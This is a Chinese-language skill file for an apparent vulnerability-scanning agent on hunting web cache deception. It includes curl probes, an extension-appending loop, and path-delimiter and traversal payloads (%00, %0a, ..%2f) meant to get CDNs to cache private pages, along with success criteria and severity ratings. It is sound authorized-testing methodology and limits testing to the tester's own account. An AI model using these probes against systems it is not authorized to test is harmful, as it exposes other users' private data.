---
name: hunt-web-cache-deception
description: Web 缓存欺骗（WCD）：缓存键与源站路径归一化不一致导致的私有响应被缓存——扩展名探测（.js/.css/.png/.ico）、路径定界符（;%00%0a%23?）、目录名伪装、后台私有数据被公开取回。区别于缓存投毒（hunt-cache-poison 是写入他人缓存）
whenToUse: "发现 CDN（CF/CloudFront/Fastly/Akamai/阿里云CDN）、静态资源长缓存策略、私有页面路径无扩展名、响应头带 Cache-Control public 的 HTML"
role: vuln-scan
enabled: true
---

# Web 缓存欺骗（WCD）

> **与缓存投毒的区别**：投毒是**写入**（污染他人缓存，危害大但风险高）；WCD 是**读出**（把别人的私有响应读回来，零副作用）。
> 原理：CDN 按**扩展名**判定是否可缓存，源站按**路径**路由且忽略多余后缀。`/account/profile.js` → CDN 认为"静态资源，缓存"，源站认为"忽略 .js，返回 /account/profile"。

## 1. 前提检查

```bash
# 响应里有 CDN 头
curl -sD - -o /dev/null "https://$TARGET/" | grep -iE "cf-cache-status|x-cache|age:|via:|x-served-by|x-cdn"

# 私有页面的缓存策略
curl -sD - -o /dev/null "https://$TARGET/account/profile" \
  -H "Cookie: $COOKIE" | grep -iE "cache-control|vary|pragma|expires"
```

| 条件 | 说明 |
|---|---|
| 存在 CDN | 必须 |
| 私有页响应 `Cache-Control: no-store/private` | 大概率不够，但**源站策略与 CDN 策略可能不一致**，仍要试 |
| CDN 对 `*.js/*.css/*.png` 有长缓存 | 攻击面 |

## 2. 核心探测：扩展名追加

对**已登录才能访问**的页面路径，追加静态后缀，看是否被缓存且能被匿名取回：

```bash
BASE="/account/profile"
for ext in .js .css .png .ico .jpg .svg .woff .json .html .txt .map; do
  u="https://$TARGET${BASE}${ext}"
  code=$(curl -s -o /dev/null -w '%{http_code}' -H "Cookie: $COOKIE" "$u")
  echo "$ext  auth=$code"
done
```

**成功判据（必须三条同时满足）**：

```bash
# ① 带 cookie 请求返回 200 且是私有内容
curl -s -H "Cookie: $COOKIE" "https://$TARGET/account/profile.js" | grep -i "你的用户名\|email\|余额"

# ② 响应头出现缓存命中
curl -sD - -o /dev/null -H "Cookie: $COOKIE" "https://$TARGET/account/profile.js" | grep -iE "x-cache: hit|cf-cache-status: hit|age: [1-9]"

# ③ 匿名（无 cookie）再请求同一 URL，仍返回同样私有内容
curl -s "https://$TARGET/account/profile.js" | grep -i "你的用户名\|email\|余额"
```

**只有③成立才是洞。** ①② 成立而③不成立 = 只是源站忽略了后缀，没被缓存，不算。

## 3. 其它定界符变体

扩展名被 WAF 拦或源站不忽略时，用路径定界符制造"缓存看见的路径 ≠ 源站看见的路径"：

```
/account/profile;.css
/account/profile%00.js
/account/profile%0a.js
/account/profile%23.js
/account/profile/.css
/account/profile/..%2f.css
/account/../account/profile.js
/account/profile?x=.css          # 部分 CDN 把 query 计入缓存键，此条通常无效
```

**归一化差异方向**：有的 CDN 解码 `%2f`，源站不解码；有的反之。两个方向都试。

## 4. 目录伪装

CDN 规则常写 `/static/*`、`/assets/*` 全缓存。若源站存在路径穿越或 rewrite，可让私有页落在该前缀下：

```
/assets/../account/profile
/static/..%2faccount%2fprofile
/api/v1/../account/profile
```

## 5. 常见误判

| 现象 | 真相 |
|---|---|
| `/account/profile.js` 返回 200 但内容是 SPA 的 index.html | 源站回落，不是私有数据 |
| 匿名请求 200 但内容为登录页 | 未穿鉴权，不成立 |
| `age: 0` 且 `x-cache: MISS` | 未命中缓存，第③条再等等或换路径 |
| 只有带 cookie 才 200，匿名 401 | CDN 没缓存私有响应，安全 |
| 响应 `Vary: Cookie` | CDN 按 cookie 分桶，基本打不动 |

## 6. 定级

| 场景 | 定级 |
|---|---|
| 匿名可读他人私有页面（含 PII/订单/余额） | **High / Critical** |
| 只能读到自己的（同账号） | 不成立 |
| 读到内部配置/接口清单 | Medium |

## 纪律

- 只用**自己的**账号 cookie 制造缓存，只用**自己的**浏览器匿名读回
- 一旦发现被缓存，**立刻停止重复请求**（否则污染扩散），并记录首次命中时间
- 报告里必须贴三张图：带 cookie 200、`x-cache: hit`、匿名同内容
